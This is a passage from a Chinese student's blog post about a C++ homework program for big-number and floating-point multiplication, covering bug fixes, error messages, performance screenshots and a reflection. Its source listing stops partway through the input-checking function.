大浮点数</h2><p>大浮点数运算执行不通过，报错是自己写的，说太多’.’了（最后一行），我们可以看到整个存储它的数组</p><p>原因找到了，是因为check检查的时候，我们输入1.0E200在这个位置记录了一个dot，转换之后，len长度发生变化，但是check函数并没有重新执行一遍，所以在最后检测到了dot，此时char_dot为2，退出程序。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697172556080-77194bef-a2e6-43f5-9e61-db6649089adb.png"></p><p>解决方法:在check前面进行科学计数法转换</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176013861-b70e340a-f5a2-4c71-8ba6-12a458be42a4.png"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176036349-4af8d6fd-c75c-4afb-b773-d007233047c3.png"></p><p>可以看到都打印成功</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697174353039-abc85c74-900c-4473-9fb1-b638adc71072.png"></p><h2 id="tRlZ1">需求7 需求8</h2><p>完善错误提示</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cout&lt;&lt;<span class="string">&quot;ERROR[0]:Please enter a valid number&quot;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;ERROR[1]:Too many dot!&quot;</span>&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;ERROR[2]:To many &#x27;E&#x27;!&quot;</span>&lt;&lt;endl;</span><br></pre></td></tr></table></figure><p>支持大数</p><p>看了看傅里叶变换，感觉很厉害，这里记录下来以后会看</p><p><a href="https://www.cnblogs.com/stelayuri/p/13347896.html">https://www.cnblogs.com/stelayuri/p/13347896.html</a></p><p>性能展示：</p><p>普通整数相乘</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176337696-b3a8f0ff-39b7-4e1a-9ccc-2d17e2cb58ec.png"></p><p>科学计数法，最后一个没有运行时间，说明崩掉了，不知道为什么最后一个会崩掉？难道是输出太多数据了？</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176682822-372476cb-1e2e-4011-9903-a96ba249bd9e.png"></p><p>感觉对于大数字还是足够快的。</p><p>不过了比较多的一个for循环，以及一个双重循环，这些就对时间有影响</p><h2 id="lfdIl">需求9</h2><p>高精度乘法的实现方案，我们用数组来存储一个一个位，这样就不会有大数的问题，按照对乘法的一般认识来写的这个程序，这样我们刚好用一个二层循环来实现乘法，先让A的每一位去乘B0，过完一次循环就到B1，以此类推。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697174883606-a3471f66-b975-4e7f-9ba8-68e2ddb4f6fd.jpeg"></p><p>核心代码就在大数乘法的部分，解释如注释，也在前面大乘法的时候解释过：</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176092804-df738d3b-4fd8-4872-9093-d275f8c9ffba.png"></p><p>项目特色，个人觉得是段代码了，转换科学计数法的时候，很简洁，借鉴了别人的方法</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1697176841489-ecf97a2d-4fcc-4304-9b2f-4f5164b77c4f.png"></p><h2 id="F2JXq">总结</h2><p>一个月的时间还是足够完成程序的，但是比较难处理的是修补程序各种想不到的bug，比如Float_Mul去掉点并记录位置的时候，此时int类型的 .  并不是其ACSII码46，而是其之前逆转字符串到int数组做的处理’.’-‘0’&#x3D;-2这个当时找了很久都没找到是什么问题，很折磨。从写浮点数开始就已经出现许多错误了，然后到check函数，check函数还是遇到许多问题的，但是还好不是什么短路求值问题，而是在科学计数法转换的时候出现的一些问题，详细见需求6。</p><p>对刚学C++的我来说，感觉在这次作业比较偏向于C，因为还没学多少C++面向对象的一些特性，什么重载还有函数模板，感觉暂时也用不上（Ptr_Print）可以，不过那个函数是我为了检查有什么问题才写的，与主题程序无关。到科学计数法这一块，才认识到面向对象对的一些特性使用起来是多么方便。</p><p>虽然，我个人认为能够完成整个任务并没有什么问题不是一件容易的事，但是，我深刻感觉到我的代码有点繁琐，许多功能并不能协同实现，一些代码带入了一些不必要的循环，有很多是我现在也没有意识到的，对于以后选取采用何种方式，必须要进行深究。</p><h1 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> flag1=<span class="literal">true</span>,flag2=<span class="literal">true</span>;</span><br><span class="line"><span class="type">int</span> *mul_result = <span class="keyword">new</span> <span class="type">int</span> [MAX]&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> len1=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len2=<span class="number">0</span>; </span><br><span class="line"><span class="type">int</span> len3=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> dotflag=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Float_Mul</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2,<span class="type">int</span>* result)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Big_Mul</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2,<span class="type">int</span>* result)</span></span>;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Dot_Flag</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Scientific_Notation</span><span class="params">(<span class="type">char</span>* ptr,<span class="type">int</span>*plen)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Ptr_Print</span><span class="params">(<span class="type">char</span>*ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Is_Scientific</span><span class="params">(<span class="type">char</span> *ptr,<span class="type">int</span> *plen)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">time_t</span> begin,end;</span><br><span class="line">    begin=<span class="built_in">clock</span>();</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> ptr1[MAX]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> ptr2[MAX]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断是否为负数，是的话通过前移字符串就取绝对值，然后打印负号</span></span><br><span class="line">        <span class="comment">//打印符号在最后面输出的时候打印</span></span><br><span class="line">        <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;argv[<span class="number">1</span>][<span class="number">0</span>],&amp;argv[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">            flag1=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(argv[<span class="number">2</span>][<span class="number">0</span>]==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;argv[<span class="number">2</span>][<span class="number">0</span>],&amp;argv[<span class="number">2</span>][<span class="number">1</span>]);</span><br><span class="line">            flag2=<span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//打印表达式</span></span><br><span class="line">        <span class="built_in">Ptr_Print</span>(argv[<span class="number">1</span>]);</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot; *&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">        <span class="built_in">Ptr_Print</span>(argv[<span class="number">2</span>]);</span><br><span class="line">        len1=<span class="built_in">strlen</span>(&amp;argv[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">        len2=<span class="built_in">strlen</span>(&amp;argv[<span class="number">2</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//检查字符串是否合法,不合法直接退出程序</span></span><br><span class="line">        <span class="built_in">Is_Scientific</span>(argv[<span class="number">1</span>],&amp;len1);</span><br><span class="line">        <span class="built_in">Is_Scientific</span>(argv[<span class="number">2</span>],&amp;len2);</span><br><span class="line">        <span class="built_in">check</span>(argv[<span class="number">1</span>],argv[<span class="number">2</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//将字符倒过来才符合规律</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len1;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr1[i]=<span class="built_in">int</span>(argv[<span class="number">1</span>][len1<span class="number">-1</span>-i]-<span class="string">&#x27;0&#x27;</span>);<span class="comment">//注意这里ptr里面存的已经是数字了，不是它的ASCII码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len2;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ptr2[i]=<span class="built_in">int</span>(argv[<span class="number">2</span>][len2<span class="number">-1</span>-i]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot; =&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">        <span class="comment">//根据判断有没有.的结果来选择进入函数</span></span><br><span class="line">        <span class="comment">//输出计算结果(逆序输出逆序算出的结果就是正序)</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Dot_Flag</span>(argv[<span class="number">1</span>],argv[<span class="number">2</span>]))</span><br><span class="line">        &#123;<span class="comment">//Entering float_Mul func()</span></span><br><span class="line">            <span class="built_in">Float_Mul</span>(ptr1,ptr2,mul_result);</span><br><span class="line">            <span class="keyword">if</span>(flag1==<span class="literal">true</span>&amp;&amp;flag2==<span class="literal">false</span>||flag1==<span class="literal">false</span>&amp;&amp;flag2==<span class="literal">true</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(mul_result[len3<span class="number">-1</span>]==<span class="number">0</span>)</span><br><span class="line">                mul_result[len3<span class="number">-1</span>]=<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(mul_result[len3<span class="number">-1</span>]==<span class="number">46</span>)</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=len3<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(mul_result[i]!=<span class="number">46</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    cout&lt;&lt;mul_result[i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>    <span class="built_in">putchar</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="comment">//Entering Big_Mul func()</span></span><br><span class="line">            <span class="built_in">Big_Mul</span>(ptr1,ptr2,mul_result);</span><br><span class="line">            <span class="keyword">if</span>(flag1==<span class="literal">true</span>&amp;&amp;flag2==<span class="literal">false</span>||flag1==<span class="literal">false</span>&amp;&amp;flag2==<span class="literal">true</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;-&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=len3<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)</span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;mul_result[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;two argument expected.&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> []mul_result;</span><br><span class="line">    end=<span class="built_in">clock</span>();</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;endl&lt;&lt;<span class="string">&quot;runtime:   &quot;</span>&lt;&lt;<span class="built_in">double</span>(end-begin)/CLOCKS_PER_SEC&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//浮点数乘法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Float_Mul</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2,<span class="type">int</span>* result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    <span class="type">int</span> dotflag1=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> dotflag2=<span class="number">0</span>;</span><br><span class="line">    len3=len1+len2;<span class="comment">//这里len还算有.的长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否为&#x27;.&#x27;,并记录位置，我们处理是将dot展示移出，等计算完再放回来</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">int</span>(ptr1[i])==<span class="built_in">int</span>(<span class="string">&#x27;.&#x27;</span>-<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            dotflag1=i;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;ptr1[i],&amp;ptr1[i+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">int</span>(ptr2[i])==<span class="built_in">int</span>(<span class="string">&#x27;.&#x27;</span>-<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            dotflag2=i;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;ptr2[i],&amp;ptr2[i+<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    dotflag=dotflag1+dotflag2;</span><br><span class="line">    <span class="built_in">Big_Mul</span>(ptr1,ptr2,mul_result);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//把小数点插进去，计算结果是 123.45的话，在存储中会是54321，把小数点插入54.321,长度len+1</span></span><br><span class="line">    <span class="comment">//strcpy(&amp;mul_result[dotflag+1],&amp;mul_result[dotflag]);</span></span><br><span class="line">    <span class="keyword">if</span>(dotflag)</span><br><span class="line">    &#123;</span><br><span class="line">        len3=len3+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=len3<span class="number">-1</span>;i&gt;dotflag;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            mul_result[i]=mul_result[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        mul_result[dotflag]=<span class="string">&#x27;.&#x27;</span>;<span class="comment">//这里本来放点。可是左值是一个INT类型</span></span><br><span class="line">        <span class="comment">//所以会转为ACSII码，这个地方会显示46,我们遇到46去替换就行了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;&quot;dot&quot;&lt;&lt;dotflag&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;len3+1;i++)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;mul_result[i]&lt;&lt;&quot;,&quot;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否采用浮点数</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Dot_Flag</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> max=len1;</span><br><span class="line">    <span class="keyword">if</span>(len1&lt;len2)</span><br><span class="line">        max=len2;</span><br><span class="line">    <span class="comment">//获取两者的最大值，以用于比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;max;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;len1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr1[i]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;len2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(ptr2[i]==<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//大整数乘法</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Big_Mul</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2,<span class="type">int</span>* mul_result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> temp;</span><br><span class="line">    len3=len1+len2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span> ; i &lt; len1 ; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        temp =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span> ; j &lt; len2 ; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            mul_result[i+j]=ptr1[i]*ptr2[j]+temp+mul_result[i+j];<span class="comment">//现有的加，之前的进位+原本的数据</span></span><br><span class="line">            temp=mul_result[i+j]/<span class="number">10</span>; <span class="comment">//留下temp用于退出循环进位，如果没有退出循环，就在循环里进位</span></span><br><span class="line">            mul_result[i+j]%=<span class="number">10</span>;</span><br><span class="line">            <span class="comment">//cout&lt;&lt;&quot;mul_result_&quot;&lt;&lt;i+j&lt;&lt;&quot;:&quot;&lt;&lt;mul_result[i+j]&lt;&lt;endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        mul_result[i+len2]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=len3<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; --i)<span class="comment">//从倒数开始，减去多余的位置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(mul_result[i]==<span class="number">0</span> &amp;&amp; len3 &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            len3--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(<span class="type">char</span> *ptr1,<span class="type">char</span>* ptr2)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">int</span> char_e=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> char_dot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> qwq=((ptr1[i]==<span class="string">&#x27;.&#x27;</span>||ptr1[i]==<span class="string">&#x27;-&#x27;</span>)||(ptr1[i]==<span class="string">&#x27;+&#x27;</span>||ptr1[i]==<span class="string">&#x27;E&#x27;</span>)||(ptr1[i]==<span class="string">&#x27;e&#x27;</span>));</span><br><span class="line">        <span class="keyword">if</span>(!((<span class="string">&#x27;0&#x27;</span>&lt;=ptr1[i]&amp;&amp;ptr1[i]&lt;=<span class="string">&#x27;9&#x27;</span>)||qwq))</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;ERROR[0]1:Please enter a valid number&quot;</span>&lt;&lt;endl;</span><br><span class="line">            